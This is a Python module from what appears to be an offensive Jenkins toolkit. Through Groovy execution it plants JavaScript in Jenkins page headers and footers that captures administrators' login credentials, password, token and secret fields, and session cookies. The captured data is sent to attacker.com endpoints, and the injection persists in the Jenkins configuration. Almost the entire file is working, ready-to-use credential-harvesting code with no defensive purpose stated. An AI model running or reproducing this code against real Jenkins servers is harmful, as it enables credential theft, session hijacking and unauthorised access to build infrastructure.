"""UI hijacking for credential harvesting.

Injects JavaScript keyloggers and form interceptors into Jenkins UI
to capture credentials of other administrators as they log in.
"""

from dataclasses import dataclass
from typing import Any, Optional


@dataclass
class UIHijackResult:
    """Result of UI hijacking operation."""
    success: bool
    injection_type: str
    exfiltration_url: Optional[str] = None
    details: str = ""
    persistence: str = "session"


class UIHijacker:
    """Jenkins UI hijacking and credential harvesting."""

    def __init__(self, session: Any):
        """Initialize UI hijacker.

        Args:
            session: Authenticated Jenkins session for Groovy execution
        """
        self.session = session

    def inject_login_keylogger(self,
                               exfil_url: str = "http://attacker.com/collect") -> UIHijackResult:
        """Inject JavaScript keylogger into login page.

        Args:
            exfil_url: URL to send captured credentials to

        Returns:
            UIHijackResult with injection status
        """
        keylogger_js = f"""
(function() {{
    var original_submit = HTMLFormElement.prototype.submit;
    HTMLFormElement.prototype.submit = function() {{
        if (this.action.includes('/j_security_check') || this.action.includes('login')) {{
            var formData = new FormData(this);
            var creds = {{}};
            formData.forEach(function(value, key) {{
                creds[key] = value;
            }});

            var xhr = new XMLHttpRequest();
            xhr.open('POST', '{exfil_url}', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify(creds));
        }}
        return original_submit.apply(this, arguments);
    }};

    document.addEventListener('submit', function(e) {{
        if (e.target.action && (e.target.action.includes('/j_security_check') || e.target.action.includes('login'))) {{
            var formData = new FormData(e.target);
            var creds = {{}};
            formData.forEach(function(value, key) {{
                creds[key] = value;
            }});

            fetch('{exfil_url}', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify(creds)
            }}).catch(function() {{}});
        }}
    }});
}})();
"""

        groovy_code = f"""
import jenkins.model.Jenkins
import hudson.model.PageDecorator
import org.kohsuke.stapler.Stapler

def jenkins = Jenkins.getInstance()

def jsCode = '''{keylogger_js}'''

try {{
    def decorators = jenkins.getExtensionList(PageDecorator.class)
    def simplePageDecorator = decorators.find {{ it.class.name.contains('SimplePageDecorator') }}

    if (simplePageDecorator == null) {{
        def footerHTML = jenkins.getDescriptorByType(jenkins.model.GlobalConfigurationCategory.get(jenkins.model.GlobalConfigurationCategory.Unclassified).class)
        if (footerHTML != null) {{
            def existingFooter = footerHTML.getFooterHTML() ?: ""
            def newFooter = existingFooter + "<script>" + jsCode + "</script>"
            footerHTML.setFooterHTML(newFooter)
            footerHTML.save()
            println "SUCCESS:Injected via footer HTML"
            return
        }}
    }} else {{
        def existingFooter = simplePageDecorator.getFooterHTML() ?: ""
        def newFooter = existingFooter + "<script>" + jsCode + "</script>"
        simplePageDecorator.setFooterHTML(newFooter)
        simplePageDecorator.save()
        println "SUCCESS:Injected via SimplePageDecorator"
        return
    }}

    println "ERROR:No suitable injection point found"
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        try:
            result = self.session.execute_groovy(groovy_code)

            if "SUCCESS" in result:
                return UIHijackResult(
                    success=True,
                    injection_type="login_keylogger",
                    exfiltration_url=exfil_url,
                    details=f"Keylogger injected. Credentials will be sent to {exfil_url}. "
                           f"Persists in Jenkins config until removed.",
                    persistence="config"
                )
            else:
                return UIHijackResult(
                    success=False,
                    injection_type="login_keylogger",
                    details=result
                )
        except Exception as e:
            return UIHijackResult(
                success=False,
                injection_type="login_keylogger",
                details=str(e)
            )

    def inject_credential_stealer(self,
                                  exfil_url: str = "http://attacker.com/creds") -> UIHijackResult:
        """Inject comprehensive credential stealer targeting all forms.

        Args:
            exfil_url: URL to exfiltrate captured data to

        Returns:
            UIHijackResult with injection status
        """
        stealer_js = f"""
(function() {{
    var captured = {{}};

    function captureInput(element) {{
        if (element.type === 'password' || element.name.toLowerCase().includes('pass') ||
            element.name.toLowerCase().includes('token') || element.name.toLowerCase().includes('secret')) {{
            var key = element.name || element.id || 'unknown';
            captured[key] = element.value;
        }}
    }}

    function exfiltrate() {{
        if (Object.keys(captured).length > 0) {{
            fetch('{exfil_url}', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    credentials: captured
                }})
            }}).catch(function() {{}});
            captured = {{}};
        }}
    }}

    document.addEventListener('input', function(e) {{
        captureInput(e.target);
    }});

    document.addEventListener('change', function(e) {{
        captureInput(e.target);
    }});

    document.addEventListener('submit', function(e) {{
        var form = e.target;
        var inputs = form.querySelectorAll('input');
        inputs.forEach(captureInput);
        exfiltrate();
    }});

    setInterval(exfiltrate, 30000);
}})();
"""

        groovy_code = f"""
import jenkins.model.Jenkins
import hudson.model.PageDecorator

def jenkins = Jenkins.getInstance()
def jsCode = '''{stealer_js}'''

try {{
    def decorators = jenkins.getExtensionList(PageDecorator.class)
    def decorator = decorators.find {{ it.class.name.contains('SimplePageDecorator') }} ?: decorators[0]

    if (decorator != null) {{
        def existingHeader = ""
        try {{
            existingHeader = decorator.getHeaderHTML() ?: ""
        }} catch (Exception e) {{}}

        def newHeader = existingHeader + "<script>" + jsCode + "</script>"
        decorator.setHeaderHTML(newHeader)
        decorator.save()
        println "SUCCESS:Credential stealer injected"
    }} else {{
        println "ERROR:No page decorator available"
    }}
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        try:
            result = self.session.execute_groovy(groovy_code)

            if "SUCCESS" in result:
                return UIHijackResult(
                    success=True,
                    injection_type="credential_stealer",
                    exfiltration_url=exfil_url,
                    details=f"Comprehensive credential stealer active. Targets all password fields, "
                           f"tokens, and secrets. Data sent to {exfil_url} every 30s.",
                    persistence="config"
                )
            else:
                return UIHijackResult(
                    success=False,
                    injection_type="credential_stealer",
                    details=result
                )
        except Exception as e:
            return UIHijackResult(
                success=False,
                injection_type="credential_stealer",
                details=str(e)
            )

    def inject_session_hijacker(self,
                               exfil_url: str = "http://attacker.com/sessions") -> UIHijackResult:
        """Inject session token stealer to capture authenticated sessions.

        Args:
            exfil_url: URL to send session tokens to

        Returns:
            UIHijackResult with injection status
        """
        hijacker_js = f"""
(function() {{
    function stealSession() {{
        var cookies = document.cookie;
        var sessionData = {{
            cookies: cookies,
            url: window.location.href,
            timestamp: new Date().toISOString(),
            username: null
        }};

        var userElement = document.querySelector('.login a') ||
                         document.querySelector('#header .login') ||
                         document.querySelector('[href*="/user/"]');

        if (userElement) {{
            sessionData.username = userElement.textContent.trim();
        }}

        fetch('{exfil_url}', {{
            method: 'POST',
            headers: {{ 'Content-Type': 'application/json' }},
            body: JSON.stringify(sessionData)
        }}).catch(function() {{}});
    }}

    if (document.readyState === 'complete') {{
        stealSession();
    }} else {{
        window.addEventListener('load', stealSession);
    }}

    setInterval(stealSession, 300000);
}})();
"""

        groovy_code = f"""
import jenkins.model.Jenkins
import hudson.model.PageDecorator

def jenkins = Jenkins.getInstance()
def jsCode = '''{hijacker_js}'''

try {{
    def decorators = jenkins.getExtensionList(PageDecorator.class)
    def decorator = decorators[0]

    def existingFooter = ""
    try {{
        existingFooter = decorator.getFooterHTML() ?: ""
    }} catch (Exception e) {{}}

    def newFooter = existingFooter + "<script>" + jsCode + "</script>"
    decorator.setFooterHTML(newFooter)
    decorator.save()

    println "SUCCESS:Session hijacker injected"
}} catch (Exception e) {{
    println "ERROR:" + e.message
}}
"""

        try:
            result = self.session.execute_groovy(groovy_code)

            if "SUCCESS" in result:
                return UIHijackResult(
                    success=True,
                    injection_type="session_hijacker",
                    exfiltration_url=exfil_url,
                    details=f"Session stealer active. Captures cookies and usernames, "
                           f"sends to {exfil_url} every 5 minutes.",
                    persistence="config"
                )
            else:
                return UIHijackResult(
                    success=False,
                    injection_type="session_hijacker",
                    details=result
                )
        except Exception as e:
            return UIHijackResult(
                success=False,
                injection_type="session_hijacker",
                details=str(e)
            )

    def remove_injections(self) -> tuple[bool, str]:
        """Remove all UI injections.

        Returns:
            Tuple of (success, message)
        """
        groovy_code = """
import jenkins.model.Jenkins
import hudson.model.PageDecorator

def jenkins = Jenkins.getInstance()

try {
    def decorators = jenkins.getExtensionList(PageDecorator.class)
    decorators.each { decorator ->
        try {
            decorator.setHeaderHTML("")
            decorator.setFooterHTML("")
            decorator.save()
        } catch (Exception e) {}
    }

    println "SUCCESS:All UI decorators cleared"
} catch (Exception e) {
    println "ERROR:" + e.message
}
"""

        try:
            result = self.session.execute_groovy(groovy_code)

            if "SUCCESS" in result:
                return True, "All UI injections removed"
            else:
                return False, result
        except Exception as e:
            return False, str(e)

    def list_injections(self) -> list[dict[str, Any]]:
        """List current UI injections.

        Returns:
            List of injection information dictionaries
        """
        groovy_code = """
import jenkins.model.Jenkins
import hudson.model.PageDecorator

def jenkins = Jenkins.getInstance()
def injections = []

try {
    def decorators = jenkins.getExtensionList(PageDecorator.class)
    decorators.eachWithIndex { decorator, index ->
        def header = ""
        def footer = ""

        try {
            header = decorator.getHeaderHTML() ?: ""
        } catch (Exception e) {}

        try {
            footer = decorator.getFooterHTML() ?: ""
        } catch (Exception e) {}

        if (header || footer) {
            println "DECORATOR_${index}:" + decorator.class.name
            if (header) println "HEADER_${index}_LEN:" + header.length()
            if (footer) println "FOOTER_${index}_LEN:" + footer.length()
        }
    }
} catch (Exception e) {
    println "ERROR:" + e.message
}
"""

        try:
            result = self.session.execute_groovy(groovy_code)

            injections = []
            current_decorator = None

            for line in result.split('\n'):
                if line.startswith("DECORATOR_"):
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        current_decorator = {
                            "class": parts[1].strip(),
                            "header_length": 0,
                            "footer_length": 0
                        }
                        injections.append(current_decorator)
                elif line.startswith("HEADER_") and current_decorator:
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        current_decorator["header_length"] = int(parts[1].strip())
                elif line.startswith("FOOTER_") and current_decorator:
                    parts = line.split(":", 1)
                    if len(parts) == 2:
                        current_decorator["footer_length"] = int(parts[1].strip())

            return injections
        except Exception:
            return []


def inject_login_keylogger(session: Any, exfil_url: str = "http://attacker.com/collect") -> UIHijackResult:
    """Quick login keylogger injection.

    Args:
        session: Jenkins session
        exfil_url: Exfiltration URL

    Returns:
        UIHijackResult with status
    """
    hijacker = UIHijacker(session)
    return hijacker.inject_login_keylogger(exfil_url)


def inject_credential_stealer(session: Any, exfil_url: str = "http://attacker.com/creds") -> UIHijackResult:
    """Quick credential stealer injection.

    Args:
        session: Jenkins session
        exfil_url: Exfiltration URL

    Returns:
        UIHijackResult with status
    """
    hijacker = UIHijacker(session)
    return hijacker.inject_credential_stealer(exfil_url)


def remove_all_injections(session: Any) -> tuple[bool, str]:
    """Remove all UI injections.

    Args:
        session: Jenkins session

    Returns:
        Tuple of (success, message)
    """
    hijacker = UIHijacker(session)
    return hijacker.remove_injections()
